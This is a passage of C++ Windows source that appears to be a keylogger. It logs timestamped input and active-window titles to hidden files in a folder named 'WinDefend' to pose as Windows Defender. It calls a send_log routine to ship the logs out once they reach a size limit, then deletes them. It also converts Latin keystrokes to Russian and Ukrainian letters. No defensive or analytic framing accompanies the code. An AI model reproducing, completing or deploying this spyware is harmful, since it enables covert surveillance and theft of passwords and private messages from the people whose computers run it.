	wstr2 += L"\r\n";

	//	Code	Replacement string
	//	%a		Abbreviated weekday name in the locale
	//	%A		Full weekday name in the locale
	//	%b		Abbreviated month name in the locale
	//	%B		Full month name in the locale
	//	%c		Dateand time representation appropriate for locale
	//	%C		The year divided by 100 and truncated to an integer, as a decimal number (00−99)
	//	%d		Day of month as a decimal number (01 - 31)
	//	%D		Equivalent to %m / %d / %y
	//	%e		Day of month as a decimal number (1 - 31), where single digits are preceded by a space
	//	%F		Equivalent to %Y - %m - %d
	//	%g		The last 2 digits of the ISO 8601 week - based year as a decimal number(00 - 99)
	//	%G		The ISO 8601 week - based year as a decimal number
	//	%h		Abbreviated month name (equivalent to % b)
	//	%H		Hour in 24 - hour format (00 - 23)
	//	%I		Hour in 12 - hour format (01 - 12)
	//	%j		Day of the year as a decimal number (001 - 366)
	//	%m		Month as a decimal number (01 - 12)
	//	%M		Minute as a decimal number (00 - 59)
	//	%n		A newline character (\n)
	//	%p		The locale's A.M./P.M. indicator for 12-hour clock
	//	%r		The locale's 12-hour clock time
	//	%R		Equivalent to %H : %M
	//	%S		Second as a decimal number (00 - 59)
	//	%t		A horizontal tab character (\t)
	//	%T		Equivalent to %H : %M : %S, the ISO 8601 time format
	//	%u		ISO 8601 weekday as a decimal number (1 - 7; Monday is 1)
	//	%U		Week number of the year as a decimal number (00 - 53), where the first Sunday is the first day of week 1
	//	%V		ISO 8601 week number as a decimal number (00 - 53)
	//	%w		Weekday as a decimal number (0 - 6; Sunday is 0)
	//	%W		Week number of the year as a decimal number (00 - 53), where the first Monday is the first day of week 1
	//	%x		Date representation for the locale
	//	%X		Time representation for the locale
	//	%y		Year without century, as decimal number (00 - 99)
	//	%Y		Year with century, as decimal number
	//	%z		The offset from UTC in ISO 8601 format; no characters if time zone is unknown
	//	%Z		Either the locale's time-zone name or time zone abbreviation, depending on registry settings; no characters if time zone is unknown
	//	%%		Percent sign

	HANDLE hfile = CreateFile(
		PATH,
		GENERIC_READ,
		FILE_SHARE_READ,
		nullptr,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_HIDDEN,
		nullptr);

	if (hfile == INVALID_HANDLE_VALUE)
	{
		CreateDirectory(L"C:\\ProgramData\\WinDefend\\", nullptr);
		hfile = CreateFile(
			PATH,
			GENERIC_READ,
			FILE_SHARE_READ,
			nullptr,
			OPEN_ALWAYS,
			FILE_ATTRIBUTE_HIDDEN,
			nullptr);
	}

	LARGE_INTEGER size = { 0 };

	GetFileSizeEx(hfile, &size);

	if (size.QuadPart >= MAX_FILE_SIZE)
	{
		CloseHandle(hfile);
		send_log();
		DeleteFile(PATH);
		li.QuadPart = 0;
	}
	else
	{
		CloseHandle(hfile);
		li.QuadPart = size.QuadPart;
	}


	hfile = CreateFile(
		PATH,
		GENERIC_WRITE,
		FILE_SHARE_READ,
		nullptr,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_HIDDEN,
		nullptr);

	olf.Offset = li.LowPart;
	olf.OffsetHigh = li.HighPart;

	DWORD iWrited = 0;
	if (hfile)
	{
		WriteFile(hfile, wstr2.c_str(), wstr2.size() * 2, &iWrited, &olf);
	}

	li.QuadPart += iWrited;

	CloseHandle(hfile);
}


void eng_to_rus(std::wstring* wstr)
{
	if (wstr->size() != 1) return;
	switch ((*wstr)[0])
	{
	case L'q':
		*wstr = std::wstring(L"й");
		break;

	case L'w':
		*wstr = std::wstring(L"ц");
		break;

	case L'e':
		*wstr = std::wstring(L"у");
		break;

	case L'r':
		*wstr = std::wstring(L"к");
		break;

	case L't':
		*wstr = std::wstring(L"е");
		break;

	case L'y':
		*wstr = std::wstring(L"н");
		break;

	case L'u':
		*wstr = std::wstring(L"г");
		break;

	case L'i':
		*wstr = std::wstring(L"ш");
		break;

	case L'o':
		*wstr = std::wstring(L"щ");
		break;

	case L'p':
		*wstr = std::wstring(L"з");
		break;

	case L'a':
		*wstr = std::wstring(L"ф");
		break;

	case L's':
		*wstr = std::wstring(L"ы");
		break;

	case L'd':
		*wstr = std::wstring(L"в");
		break;

	case L'f':
		*wstr = std::wstring(L"а");
		break;

	case L'g':
		*wstr = std::wstring(L"п");
		break;

	case L'h':
		*wstr = std::wstring(L"р");
		break;

	case L'j':
		*wstr = std::wstring(L"о");
		break;

	case L'k':
		*wstr = std::wstring(L"л");
		break;

	case L'l':
		*wstr = std::wstring(L"д");
		break;

	case L'z':
		*wstr = std::wstring(L"я");
		break;

	case L'x':
		*wstr = std::wstring(L"ч");
		break;

	case L'c':
		*wstr = std::wstring(L"с");
		break;

	case L'v':
		*wstr = std::wstring(L"м");
		break;

	case L'b':
		*wstr = std::wstring(L"и");
		break;

	case L'n':
		*wstr = std::wstring(L"т");
		break;

	case L'm':
		*wstr = std::wstring(L"ь");
		break;
	}
}

void eng_to_ukr(std::wstring* wstr)
{
	if (wstr->size() != 1) return;
	switch ((*wstr)[0])
	{
	case L'q':
		*wstr = std::wstring(L"й");
		break;

	case L'w':
		*wstr = std::wstring(L"ц");
		break;

	case L'e':
		*wstr = std::wstring(L"у");
		break;

	case L'r':
		*wstr = std::wstring(L"к");
		break;

	case L't':
		*wstr = std::wstring(L"е");
		break;

	case L'y':
		*wstr = std::wstring(L"н");
		break;

	case L'u':
		*wstr = std::wstring(L"г");
		break;

	case L'i':
		*wstr = std::wstring(L"ш");
		break;

	case L'o':
		*wstr = std::wstring(L"щ");
		break;

	case L'p':
		*wstr = std::wstring(L"з");
		break;

	case L'a':
		*wstr = std::wstring(L"ф");
		break;

	case L's':
		*wstr = std::wstring(L"і");
		break;

	case L'd':
		*wstr = std::wstring(L"в");
		break;

	case L'f':
		*wstr = std::wstring(L"а");
		break;

	case L'g':
		*wstr = std::wstring(L"п");
		break;

	case L'h':
		*wstr = std::wstring(L"р");
		break;

	case L'j':
		*wstr = std::wstring(L"о");
		break;

	case L'k':
		*wstr = std::wstring(L"л");
		break;

	case L'l':
		*wstr = std::wstring(L"д");
		break;

	case L'z':
		*wstr = std::wstring(L"я");
		break;

	case L'x':
		*wstr = std::wstring(L"ч");
		break;

	case L'c':
		*wstr = std::wstring(L"с");
		break;

	case L'v':
		*wstr = std::wstring(L"м");
		break;

	case L'b':
		*wstr = std::wstring(L"и");
		break;

	case L'n':
		*wstr = std::wstring(L"т");
		break;

	case L'm':
		*wstr = std::wstring(L"ь");
		break;
	}
}


void eng_to_rus_upper(std::wstring* wstr)
{
	if (wstr->size() != 1) return;
	switch ((*wstr)[0])
	{
	case L'Q':
		*wstr = std::wstring(L"Й");
		break;

	case L'W':
		*wstr = std::wstring(L"Ц");
		break;

	case L'E':
		*wstr = std::wstring(L"У");
		break;

	case L'R':
		*wstr = std::wstring(L"К");
		break;

	case L'T':
		*wstr = std::wstring(L"Е");
		break;

	case L'Y':
		*wstr = std::wstring(L"Н");
		break;

	case L'U':
		*wstr = std::wstring(L"Г");
		break;

	case L'I':
		*wstr = std::wstring(L"Ш");
		break;

	case L'O':
		*wstr = std::wstring(L"Щ");
		break;

	case L'P':
		*wstr = std::wstring(L"З");
		break;

	case L'A':
		*wstr = std::wstring(L"Ф");
		break;

	case L'S':
		*wstr = std::wstring(L"Ы");
		break;

	case L'D':
		*wstr = std::wstring(L"В");
		break;

	case L'F':
		*wstr = std::wstring(L"А");
		break;

	case L'G':
		*wstr = std::wstring(L"П");
		break;

	case L'H':
		*wstr = std::wstring(L"Р");
		break;

	case L'J':
		*wstr = std::wstring(L"О");
		break;

	case L'K':
		*wstr = std::wstring(L"Л");
		break;

	case L'L':
		*wstr = std::wstring(L"Д");
		break;

	case L'Z':
		*wstr = std::wstring(L"Я");
		break;

	case L'X':
		*wstr = std::wstring(L"Ч");
		break;

	case L'C':
		*wstr = std::wstring(L"С");
		break;

	case L'V':
		*wstr = std::wstring(L"М");
		break;

	case L'B':
		*wstr = std::wstring(L"И");
		break;

	case L'N':
		*wstr = std::wstring(L"Т");
		break;

	case L'M':
		*wstr = std::wstring(L"Ь");
		break;
	}
}

void eng_to_ukr_upper(std::wstring* wstr)
{
	if (wstr->size() != 1) return;
	switch ((*wstr)[0])
	{
	case L'Q':
		*wstr = std::wstring(L"Й");
		break;

	case L'W':
		*wstr = std::wstring(L"Ц");
		break;

	case L'E':
		*wstr = std::wstring(L"У");
		break;

	case L'R':
		*wstr = std::wstring(L"К");
		break;

	case L'T':
		*wstr = std::wstring(L"Е");
		break;

	case L'Y':
		*wstr = std::wstring(L"Н");
		break;

	case L'U':
		*wstr = std::wstring(L"Г");
		break;

	case L'I':
		*wstr = std::wstring(L"Ш");
		break;

	case L'O':
		*wstr = std::wstring(L"Щ");
		break;

	case L'P':
		*wstr = std::wstring(L"З");
		break;

	case L'A':
		*wstr = std::wstring(L"Ф");
		break;

	case L'S':
		*wstr = std::wstring(L"І");
		break;

	case L'D':
		*wstr = std::wstring(L"В");
		break;

	case L'F':
		*wstr = std::wstring(L"А");
		break;

	case L'G':
		*wstr = std::wstring(L"П");
		break;

	case L'H':
		*wstr = std::wstring(L"Р");
		break;

	case L'J':
		*wstr = std::wstring(L"О");
		break;

	case L'K':
		*wstr = std::wstring(L"Л");
		break;

	case L'L':
		*wstr = std::wstring(L"Д");
		break;

	case L'Z':
		*wstr = std::wstring(L"Я");
		break;

	case L'X':
		*wstr = std::wstring(L"Ч");
		break;

	case L'C':
		*wstr = std::wstring(L"С");
		break;

	case L'V':
		*wstr = std::wstring(L"М");
		break;

	case L'B':
		*wstr = std::wstring(L"И");
		break;

	case L'N':
		*wstr = std::wstring(L"Т");
		break;

	case L'M':
		*wstr = std::wstring(L"Ь");
		break;
	}
}


void write_win_name_to_file(std::wstring* wstr)
{
	// write current time and date in format [seconds]:[minutes]:[hours] [day].[month].[year] [weekday] \t
	time_t rawtime = time(0);
	tm* timeinfo = localtime(&rawtime);

	wchar_t* formated_time = new wchar_t[260];

	wcsftime(formated_time, 259, L"%S:%M:%H %d.%m.%Y %A %t", timeinfo); // formatting time

	std::wstring wstr2((const wchar_t*)formated_time);
	wstr2 += wstr->c_str();
	wstr2 += L"\r\n";

	//	Code	Replacement string
	//	%a		Abbreviated weekday name in the locale
	//	%A		Full weekday name in the locale
	//	%b		Abbreviated month name in the locale
	//	%B		Full month name in the locale
	//	%c		Dateand time representation appropriate for locale
	//	%C		The year divided by 100 and truncated to an integer, as a decimal number (00−99)
	//	%d		Day of month as a decimal number (01 - 31)
	//	%D		Equivalent to %m / %d / %y
	//	%e		Day of month as a decimal number (1 - 31), where single digits are preceded by a space
	//	%F		Equivalent to %Y - %m - %d
	//	%g		The last 2 digits of the ISO 8601 week - based year as a decimal number(00 - 99)
	//	%G		The ISO 8601 week - based year as a decimal number
	//	%h		Abbreviated month name (equivalent to % b)
	//	%H		Hour in 24 - hour format (00 - 23)
	//	%I		Hour in 12 - hour format (01 - 12)
	//	%j		Day of the year as a decimal number (001 - 366)
	//	%m		Month as a decimal number (01 - 12)
	//	%M		Minute as a decimal number (00 - 59)
	//	%n		A newline character (\n)
	//	%p		The locale's A.M./P.M. indicator for 12-hour clock
	//	%r		The locale's 12-hour clock time
	//	%R		Equivalent to %H : %M
	//	%S		Second as a decimal number (00 - 59)
	//	%t		A horizontal tab character (\t)
	//	%T		Equivalent to %H : %M : %S, the ISO 8601 time format
	//	%u		ISO 8601 weekday as a decimal number (1 - 7; Monday is 1)
	//	%U		Week number of the year as a decimal number (00 - 53), where the first Sunday is the first day of week 1
	//	%V		ISO 8601 week number as a decimal number (00 - 53)
	//	%w		Weekday as a decimal number (0 - 6; Sunday is 0)
	//	%W		Week number of the year as a decimal number (00 - 53), where the first Monday is the first day of week 1
	//	%x		Date representation for the locale
	//	%X		Time representation for the locale
	//	%y		Year without century, as decimal number (00 - 99)
	//	%Y		Year with century, as decimal number
	//	%z		The offset from UTC in ISO 8601 format; no characters if time zone is unknown
	//	%Z		Either the locale's time-zone name or time zone abbreviation, depending on registry settings; no characters if time zone is unknown
	//	%%		Percent sign

	HANDLE hfile = CreateFile(
		WINNAME_FILE_PATH,
		GENERIC_READ,
		FILE_SHARE_READ,
		nullptr,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_HIDDEN,
		nullptr);

	if (hfile == INVALID_HANDLE_VALUE)
	{
		CreateDirectory(L"C:\\ProgramData\\WinDefend\\", nullptr);
		hfile = CreateFile(
			WINNAME_FILE_PATH,
			GENERIC_READ,
			FILE_SHARE_READ,
			nullptr,
			OPEN_ALWAYS,
			FILE_ATTRIBUTE_HIDDEN,
			nullptr);
	}

	LARGE_INTEGER size = { 0 };

	GetFileSizeEx(hfile, &size);

	if (size.QuadPart >= MAX_FILE_SIZE)
	{
		CloseHandle(hfile);
		send_log();
		DeleteFile(WINNAME_FILE_PATH);
		li.QuadPart = 0;
	}
	else
	{
		CloseHandle(hfile);
		li.QuadPart = size.QuadPart;
	}


	hfile = CreateFile(
		WINNAME_FILE_PATH,
		GENERIC_WRITE,
		FILE_SHARE_READ,
		nullptr,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_HIDDEN,
		nullptr);

	olf.Offset = li.LowPart;
	olf.OffsetHigh = li.HighPart;

	DWORD iWrited = 0;
	if (hfile)
	{
		WriteFile(hfile, wstr2.c_str(), wstr2.size() * 2, &iWrited, &olf);
	}

	li.QuadPart += iWrited;

	CloseHandle(hfile);
}

DWORD get_active_window_layout()
{
	HWND active = GetForegroundWindow();
	// ===
	LPWSTR name = new WCHAR[1024 + 1];
	name[1024] = 0;
	GetWindowText(active, name, 1024 * 2);
	std::wstring* wstr = new std::wstring(name);
	write_win_name_to_file(wstr);
	// ===
	DWORD thread_id = GetWindowThreadProcessId(active, nullptr);
	return LOWORD(GetKeyboardLayout(thread_id));
}
